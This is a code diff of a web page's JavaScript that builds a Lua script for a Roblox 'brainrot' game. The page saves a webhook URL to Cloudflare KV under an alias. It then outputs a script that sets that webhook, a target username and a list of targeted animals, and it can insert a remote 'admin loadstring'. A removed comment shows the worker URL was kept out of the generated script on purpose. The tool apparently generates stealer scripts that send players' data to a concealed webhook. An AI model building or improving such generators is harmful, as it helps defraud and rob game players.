@@ -976,6 +976,7 @@ async function generate() {
   const webhook = document.getElementById('webhookInput').value.trim();
   const out = document.getElementById('outputBlock');
 
+  // Vérifications de base
   if (selected.size === 0) {
     out.className = 'code-block empty';
     out.textContent = '-- Please select at least one brainrot animal.';
@@ -996,19 +997,28 @@ async function generate() {
 
   // Sauvegarde de l'alias dans Cloudflare KV
   try {
+    out.className = 'code-block empty';
+    out.textContent = '-- Generating script, please wait...';
+
     const response = await fetch(`${KV_WORKER_URL}/store`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ alias, url: webhook })
     });
-    if (!response.ok) throw new Error('KV store failed');
+
+    if (!response.ok) {
+      const errorData = await response.json();
+      throw new Error(errorData.error || 'Failed to save webhook.');
+    }
+
   } catch (error) {
     console.error(error);
     out.className = 'code-block empty';
-    out.textContent = '-- Erreur lors de la sauvegarde dans Cloudflare KV.';
+    out.textContent = `-- Error: ${error.message}`;
     return;
   }
 
+  // Génération du script Lua
   const names = [...selected];
   const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
 
@@ -1023,7 +1033,7 @@ end)
     adminScriptPart = customAdminLoadstring;
   }
 
-  // Script simplifié (sans URL du worker visible)
+  // Script final
   const script = `getgenv().WEBHOOK_URL = "${alias}"
 getgenv().TARGET_USERNAME = "${username}"
 getgenv().TARGET_BRAINROT = {
